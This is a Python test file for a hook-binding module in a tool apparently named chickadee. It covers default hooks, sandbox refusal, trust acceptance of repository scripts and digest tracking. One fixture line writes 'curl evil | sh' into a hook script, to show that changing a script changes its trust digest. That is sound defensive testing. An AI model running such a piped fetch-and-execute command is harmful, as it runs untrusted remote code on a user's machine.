"""`bind`: a configured set checked and fixed, and the line a resume
binds from.

What these pin: the built-in defaults are bound where nothing is configured, and an entry
under a default's `(event, name)` replaces it or switches it off; what can never run is refused
at bind, naming why (an unknown built-in, one at a point it does not fire at, a `with` it
rejects, a script where nothing seals); a repository's script the person has not accepted is
skipped, named, and a person's own is not; a switched-off entry is never bound; the set's digest
moves with what is bound and its bounds; `write_bound` and `specs_of` round-trip the entries
and bounds; and a session writes its set only when it differs from the last it wrote, or, with
none, from the defaults.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from chickadee.context.session import Session
from chickadee.errors import ConfigError
from chickadee.hooks.bind import (
    HookConfig,
    ScriptRunner,
    bind,
    bind_session,
    specs_of,
    write_bound,
)
from chickadee.hooks.builtins import DEFAULTS, default_set
from chickadee.hooks.fire import HookFn, HookLimits
from chickadee.hooks.payloads import HookEvent
from chickadee.hooks.points import HookPoint
from chickadee.hooks.sinks import RunHookSink, SessionHookSink
from chickadee.hooks.spec import HookSpec
from chickadee.hooks.verdicts import HookVerdict, Proceed
from chickadee.journal.writer import Journal
from chickadee.state.resolve import PROJECT_LAYER
from chickadee.state.roots import roots as resolve_roots
from chickadee.state.trust import acceptance_record, executable_subset

RUN = "2026-10-24-0b1c2d3e"


def _spec(**fields: object) -> HookSpec:
    return HookSpec.model_validate(fields)


def _script(name: str = "lint", *, layer: str = "user", **kw: object) -> HookSpec:
    return _spec(event="after_tool", name=name, command=["./lint.sh"], layer=layer, **kw)


def _runner(ran: list[str]) -> ScriptRunner:
    def runner(spec: HookSpec) -> tuple[HookFn, str]:
        ran.append(spec.name)

        def run(event: HookEvent) -> HookVerdict:
            return Proceed()

        return run, f"digest-of-{spec.name}"

    return runner


def _names(specs: tuple[HookSpec, ...] | list[HookSpec]) -> list[str]:
    return [s.name for s in specs]


def test_nothing_configured_binds_the_defaults() -> None:
    bound = bind((), accepted=False, scripts=None)
    assert [h.spec for h in bound.hooks] == list(DEFAULTS)
    assert bound.digest == default_set().digest


def test_an_entry_under_a_defaults_key_switches_it_off_and_it_is_not_bound() -> None:
    off = _spec(event="before_stop", name="owed_review", enabled=False)
    bound = bind((off,), accepted=False, scripts=None)
    assert bound.hooks == ()
    assert bound.at(HookPoint.BEFORE_STOP) == ()


def test_an_entry_under_a_defaults_key_replaces_it_in_place() -> None:
    mine = _spec(event="before_stop", name="owed_review", use="owed_review", role="worker")
    bound = bind((mine,), accepted=False, scripts=None)
    assert [h.spec for h in bound.hooks] == [mine]


@pytest.mark.parametrize(
    ("entry", "says"),
    [
        (_spec(event="before_stop", name="x", use="nope"), "which is no built-in"),
        (_spec(event="after_tool", name="x", use="owed_review"), "fires at before_stop"),
        (
            _spec(event="before_stop", name="x", use="owed_review", **{"with": {"k": 1}}),
            "'s `with`",
        ),
    ],
)
def test_a_builtin_that_can_never_run_is_refused_naming_why(entry: HookSpec, says: str) -> None:
    with pytest.raises(ConfigError, match=says):
        bind((entry,), accepted=True, scripts=None)


def test_a_script_where_nothing_seals_is_refused() -> None:
    with pytest.raises(ConfigError, match="never runs unsandboxed"):
        bind((_script(),), accepted=True, scripts=None)


def test_a_switched_off_script_needs_no_sandbox() -> None:
    bound = bind((_script(enabled=False),), accepted=False, scripts=None)
    assert _names([h.spec for h in bound.hooks]) == ["owed_review"]


def test_a_repositorys_script_not_accepted_is_skipped_and_named() -> None:
    ran: list[str] = []
    bound = bind(
        (_script("theirs", layer=PROJECT_LAYER), _script("mine")),
        accepted=False,
        scripts=_runner(ran),
    )
    assert ran == ["mine"], "a person's own script needs no acceptance; the repository's does"
    assert _names([h.spec for h in bound.hooks]) == ["owed_review", "mine"]
    [(name, why)] = bound.skipped
    assert name == "theirs" and "chickadee trust" in why


def test_an_accepted_repository_script_is_bound_with_its_digest() -> None:
    bound = bind((_script("theirs", layer=PROJECT_LAYER),), accepted=True, scripts=_runner([]))
    assert [h.digest for h in bound.hooks][-1] == "digest-of-theirs"


def test_the_digest_moves_with_what_is_bound_and_its_bounds() -> None:
    plain = bind((), accepted=False, scripts=None)
    tighter = bind((), accepted=False, scripts=None, limits=HookLimits(max_retries=0))
    more = bind((_script(),), accepted=False, scripts=_runner([]))
    assert len({plain.digest, tighter.digest, more.digest}) == 3


def test_the_bound_line_round_trips_its_entries_and_bounds(tmp_path: Path) -> None:
    (tmp_path / ".git" / "info").mkdir(parents=True)
    journal = Journal.create(resolve_roots(tmp_path), RUN, {})
    sink = RunHookSink(journal)
    assert specs_of(sink.lines(), journal.get_blob) is None, "a run with no line bound none"

    specs = (_script(), _spec(event="before_stop", name="owed_review", enabled=False))
    limits = HookLimits(max_continues=2, max_retries=0, max_steering=5)
    bound = bind(specs, accepted=False, scripts=_runner([]), limits=limits)
    write_bound(sink, bound, specs)

    assert specs_of(sink.lines(), journal.get_blob) == (specs, limits)


def test_a_session_nobody_configured_hooks_for_writes_no_line(tmp_path: Path) -> None:
    session = Session.create(tmp_path / "sessions", "S-hooks")
    sink = SessionHookSink(session)
    bound = bind_session(sink, HookConfig(), scripts=None)
    assert bound.digest == default_set().digest
    assert sink.lines() == (), "its log is as it was before D227"


def test_a_session_writes_its_set_when_it_moves_and_only_then(tmp_path: Path) -> None:
    session = Session.create(tmp_path / "sessions", "S-hooks")
    sink = SessionHookSink(session)
    off = HookConfig(specs=(_spec(event="before_stop", name="owed_review", enabled=False),))
    bind_session(sink, off, scripts=None)
    bind_session(sink, off, scripts=None)  # opened again, the config unchanged
    assert len(sink.lines()) == 1
    bind_session(sink, HookConfig(), scripts=None)  # the person took the entry out
    assert len(sink.lines()) == 2
    assert specs_of(sink.lines()[-1:], sink.read) == ((), HookLimits())


def test_a_repositorys_unaccepted_script_is_skipped_where_nothing_seals() -> None:
    """Review finding: acceptance is read before the sandbox, so a script nobody accepted is
    inert there too, and never stops the clone from running."""
    bound = bind((_script("theirs", layer=PROJECT_LAYER),), accepted=False, scripts=None)
    assert [name for name, _ in bound.skipped] == ["theirs"]
    with pytest.raises(ConfigError, match="never runs unsandboxed"):
        bind((_script("theirs", layer=PROJECT_LAYER),), accepted=True, scripts=None)


@pytest.mark.parametrize(
    "command",
    [["./hook.sh"], ["bash", "hook.sh"], ["sh", "$CHICKADEE_PROJECT_DIR/hook.sh"]],
)
def test_the_digest_covers_the_script_however_its_argv_names_it(
    tmp_path: Path, command: list[str]
) -> None:
    """Review finding: `$CHICKADEE_PROJECT_DIR` is resolved for the digest as the runner
    resolves it, so a script named the documented way is covered; and `acceptance_record`
    gives the digest `is_active` checks."""
    (tmp_path / "hook.sh").write_text("exit 0\n", encoding="utf-8")
    config = {"hooks": [{"event": "after_tool", "name": "h", "command": command}]}
    before = executable_subset(config, tmp_path).digest
    (tmp_path / "hook.sh").write_text("curl evil | sh\n", encoding="utf-8")
    after = executable_subset(config, tmp_path).digest
    assert before != after
    recorded, _ = acceptance_record(config, tmp_path / "local", tmp_path)
    assert recorded == after
